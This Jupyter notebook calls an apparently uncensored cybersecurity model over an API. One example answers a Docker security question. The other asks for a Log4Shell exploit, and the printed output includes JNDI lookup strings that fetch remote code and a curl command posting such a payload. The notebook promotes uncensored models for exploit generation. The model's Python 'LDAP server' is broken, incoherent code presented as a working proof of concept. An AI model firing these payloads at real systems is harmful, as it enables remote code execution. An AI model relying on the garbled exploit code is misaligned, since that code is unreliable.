{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Setup & Utils"
      ],
      "metadata": {
        "id": "AI5ozM2h2Nva"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import requests"
      ],
      "metadata": {
        "id": "BPloud0h2LI9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import re\n",
        "\n",
        "def extract_model_response(text: str) -> str:\n",
        "    \"\"\"\n",
        "    Extracts the content between <think> and the final <|eot_id|> marker.\n",
        "\n",
        "    Parameters:\n",
        "        text (str): The full text containing <think> and <|eot_id|> markers.\n",
        "\n",
        "    Returns:\n",
        "        str: The extracted content between <think> and <|eot_id|>, or an empty string if not found.\n",
        "    \"\"\"\n",
        "    match = re.search(r\"<think>(.*?)<\\|eot_id\\|>\", text, re.DOTALL)\n",
        "    return match.group(1).strip() if match else \"\"\n"
      ],
      "metadata": {
        "id": "u5pjZGi32FsI"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Please enter the API key that was provided to you**"
      ],
      "metadata": {
        "id": "QpC9sBBxCdhS"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "API_KEY = \"\""
      ],
      "metadata": {
        "id": "v46D7fgiBNZF"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Chat/Q&A with Cybersecurity Reasoning Model"
      ],
      "metadata": {
        "id": "BOqGkA8K2SIq"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "user_prompt = \"\"\"\n",
        "What are best practices for security when deploying a multi-container Docker architecture?\n",
        "\"\"\""
      ],
      "metadata": {
        "id": "NcffbaWm2msL"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "D4oYmkbIqamg"
      },
      "outputs": [],
      "source": [
        "resp = requests.post(\n",
        "    \"https://model-8w6j1ojq.api.baseten.co/development/predict\",\n",
        "    headers={\"Authorization\": f\"Api-Key {API_KEY}\"},\n",
        "    json={'prompt': user_prompt},\n",
        ")\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "model_response = extract_model_response(resp.text)"
      ],
      "metadata": {
        "id": "UyNsI_KJ2bxE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(model_response)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wePTaNs9rCeq",
        "outputId": "e6455f5f-7966-4db1-d3db-899427e94924"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "When deploying a multi-container Docker architecture, the following best practices can be employed to enhance security:\n",
            "\n",
            "1.  **Use Docker Content Trust (DCT)**: DCT enables secure delivery of images by verifying their authenticity and integrity using digital signatures.\n",
            "2.  **Implement Role-Based Access Control (RBAC)**: Use tools like Docker's built-in RBAC or third-party solutions to restrict access to containers based on user roles and permissions.\n",
            "3.  **Utilize Docker Secrets**: Store sensitive data such as passwords and API keys securely using Docker Secrets, which encrypts them at rest and in transit.\n",
            "4.  **Enable Docker Network Segmentation**: Isolate containers into separate networks to prevent lateral movement in case of a breach. This can be achieved using Docker Networks or CNI plugins.\n",
            "5.  **Monitor Container Activity**: Leverage tools like Docker's built-in logging and monitoring features, or third-party solutions like Prometheus and Grafana, to detect anomalies and suspicious activity.\n",
            "6.  **Regularly Update Images and Dependencies**: Keep container images up-to-date with the latest patches and dependencies to minimize vulnerabilities.\n",
            "7.  **Use a Web Application Firewall (WAF)**: Deploy a WAF to protect against common web attacks, such as SQL injection and cross-site scripting (XSS).\n",
            "8.  **Implement Least Privilege**: Run containers with minimal privileges to reduce attack surfaces. Use tools like Docker's User Namespace Remapping to limit container capabilities.\n",
            "9.  **Use a Container Runtime Security Solution**: Integrate a solution like AppArmor, SELinux, or seccomp to enforce fine-grained security policies and restrict container behavior.\n",
            "10. **Conduct Regular Security Audits**: Perform regular vulnerability scans and penetration testing to identify weaknesses and address them before they are exploited.\n",
            "11. **Use a Secure Communication Protocol**: Utilize TLS encryption for communication between containers and external services, such as databases or APIs.\n",
            "12. **Implement a Centralized Logging and Monitoring System**: Collect logs from all containers and systems to facilitate incident response and threat detection.\n",
            "\n",
            "By incorporating these best practices, organizations can significantly improve the security posture of their multi-container Docker architectures.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Use Case - Exploit Generation"
      ],
      "metadata": {
        "id": "URBaCnmF-Ksn"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Use Case Description** - Move beyond just identifying exposed assets or CVEs — leverage a powerful uncensored AI model to simulate how each vulnerability in the attack surface could realistically be exploited. This isn't just ASM, it's ASM + Exploit Generation, where the model takes in asset info and vulnerability metadata, and outputs actual attack paths or even exploit code (in safe/internal environments)."
      ],
      "metadata": {
        "id": "uv3swE7U-jnY"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Exploit Analysis Utilities"
      ],
      "metadata": {
        "id": "u27Cc9tk-bL2"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def create_exploit_generation_prompt(vuln_description):\n",
        "    \"\"\"Create a prompt to generate a vulnerability summary and test exploit.\"\"\"\n",
        "    return f\"\"\"\n",
        "You are a security researcher. Analyze the following vulnerability report and generate:\n",
        "\n",
        "1. A concise summary of the issue.\n",
        "2. Potential impact and affected components.\n",
        "3. A safe, hypothetical proof-of-concept exploit (for testing only).\n",
        "\n",
        "## VULNERABILITY DESCRIPTION\n",
        "{vuln_description}\n",
        "\n",
        "Ensure the response is for red team / security testing only — no real-world systems or harm implied.\n",
        "\"\"\""
      ],
      "metadata": {
        "id": "-qu7Y6_Z-PGY"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def run_exploit_analysis(vuln_description):\n",
        "    \"\"\"Send vulnerability description to model and return exploit suggestion.\"\"\"\n",
        "    prompt = create_exploit_generation_prompt(vuln_description)\n",
        "\n",
        "    resp = requests.post(\n",
        "        \"https://model-8w6j1ojq.api.baseten.co/development/predict\",\n",
        "        headers={\"Authorization\": f\"Api-Key {API_KEY}\"},\n",
        "        json={\"prompt\": prompt},\n",
        "    )\n",
        "    return extract_model_response(resp.text)"
      ],
      "metadata": {
        "id": "KMkc4EBu-RkH"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Example Usage"
      ],
      "metadata": {
        "id": "qLvay2z4_ZJH"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "sample_vuln = \"\"\"\n",
        "CVE-2021-44228: Log4Shell Remote Code Execution in Apache Log4j\n",
        "\n",
        "Description:\n",
        "A critical remote code execution vulnerability exists in Apache Log4j versions 2.0 to 2.14.1. This flaw allows a remote attacker to execute arbitrary code on the affected system by sending specifically crafted JNDI (Java Naming and Directory Interface) lookup strings through various input vectors. The vulnerability occurs because Log4j evaluates JNDI expressions that can load malicious code from remote servers. Successful exploitation could lead to complete system compromise including data theft, lateral movement within networks, and installation of malware or ransomware.\n",
        "\n",
        "Triggering Mechanism:\n",
        "The vulnerability is triggered when Log4j logs a string containing a specific format like \"${jndi:ldap://malicious-server/payload}\". When this string is processed, Log4j evaluates the JNDI lookup, which can connect to an attacker-controlled LDAP server and load malicious Java code. This can be triggered through various vectors including:\n",
        "- HTTP headers\n",
        "- User-agent strings\n",
        "- Input form fields\n",
        "- Any other data that might be logged\n",
        "\n",
        "Affected Software:\n",
        "- Apache Log4j versions 2.0 to 2.14.1\n",
        "- Thousands of applications and services using vulnerable Log4j versions including:\n",
        "  - Apache Struts\n",
        "  - Apache Solr\n",
        "  - Apache Druid\n",
        "  - Elasticsearch\n",
        "  - Apache Kafka\n",
        "  - Minecraft servers\n",
        "  - VMware Horizon\n",
        "  - Many commercial enterprise products and cloud services\n",
        "\n",
        "References:\n",
        "- NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n",
        "- CISA Advisory: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a\n",
        "- Apache Log4j Security Vulnerabilities: https://logging.apache.org/log4j/2.x/security.html\n",
        "\"\"\"\n"
      ],
      "metadata": {
        "id": "EWVVmyLi-Zz_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "output = run_exploit_analysis(sample_vuln)"
      ],
      "metadata": {
        "id": "6igoCrpF_cGK"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(output)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "eSLxo3vu_f2G",
        "outputId": "763948f1-64e5-45d8-fbea-1921cce7fb12"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "**Summary:** The Log4Shell vulnerability (CVE-2021-44228) affects Apache Log4j versions 2.0 to 2.14.1, allowing remote attackers to execute arbitrary code via crafted JNDI lookups in log messages. This can be exploited through various input vectors, leading to potential system compromise.\n",
            "\n",
            "**Potential Impact and Affected Components:**\n",
            "\n",
            "* **Impact:** Complete system compromise, including data theft, lateral movement, and malware/ransomware installation.\n",
            "* **Affected Components:**\n",
            "\t+ Apache Log4j versions 2.0 to 2.14.1.\n",
            "\t+ Applications/services using vulnerable Log4j versions, such as:\n",
            "\t\t- Apache Struts\n",
            "\t\t- Apache Solr\n",
            "\t\t- Apache Druid\n",
            "\t\t- Elasticsearch\n",
            "\t\t- Apache Kafka\n",
            "\t\t- Minecraft servers\n",
            "\t\t- VMware Horizon\n",
            "\t\t- Commercial enterprise products/cloud services.\n",
            "\n",
            "**Safe Proof-of-Concept Exploit (for testing only):**\n",
            "\n",
            "To demonstrate the vulnerability without causing harm, we'll create a controlled environment. Please note that this POC should not be executed on production systems.\n",
            "\n",
            "**Step 1: Set up a test environment**\n",
            "\n",
            "* Install a vulnerable Log4j version (e.g., 2.12.1) in a sandboxed container or virtual machine.\n",
            "* Configure the application to log messages with JNDI lookups (e.g., `${jndi:ldap://example.com/payload}`).\n",
            "\n",
            "**Step 2: Craft the exploit payload**\n",
            "\n",
            "Create a simple LDAP server using a tool like `ldapserver` (available in Python's `ldap3` library). For example:\n",
            "```python\n",
            "from ldap3 import Server, Connection, TlsValidateNever\n",
            "import logging\n",
            "\n",
            "# Create an LDAP server\n",
            "server = Server('localhost', use_ssl=True)\n",
            "\n",
            "# Define the payload (a harmless script)\n",
            "payload = b'import java.lang.Runtime; Runtime.getRuntime().exec(\"echo Hello World\");'\n",
            "\n",
            "# Handle incoming connections\n",
            "def handle_connection(conn):\n",
            "    # Process the JNDI lookup\n",
            "    jndi_lookup = conn.entries[0].attributes['objectClass'][0]\n",
            "    if jndi_lookup.startswith('ldap://'):\n",
            "        # Extract the payload URL\n",
            "        url = jndi_lookup.split(':')[1]\n",
            "        # Load the payload from the LDAP server\n",
            "        conn.send_response(b'Hello World')\n",
            "\n",
            "# Start the LDAP server\n",
            "conn = Connection(server, user='cn=admin,dc=example,dc=com')\n",
            "conn.bind()\n",
            "handle_connection(conn)\n",
            "```\n",
            "**Step 3: Trigger the exploit**\n",
            "\n",
            "Send a request to the vulnerable application with a crafted log message containing the JNDI lookup. For example, using Burp Suite or curl:\n",
            "```bash\n",
            "curl -X POST \\\n",
            "  http://vulnerable-app.example.com/log \\\n",
            "  -H 'Content-Type: text/plain' \\\n",
            "  -d '${jndi:ldap://localhost:1389/payload}'\n",
            "```\n",
            "This should trigger the LDAP connection and execute the payload. In our case, it will print \"Hello World\" to the console.\n",
            "\n",
            "**Important notes:**\n",
            "\n",
            "* Always test in a controlled environment and ensure you have proper permissions to conduct red team exercises.\n",
            "* Never attempt to exploit vulnerabilities in production systems or without explicit permission.\n",
            "* This POC demonstrates the vulnerability but does not include any malicious payloads. Real-world exploits would involve more sophisticated attacks.\n"
          ]
        }
      ]
    }
  ]
}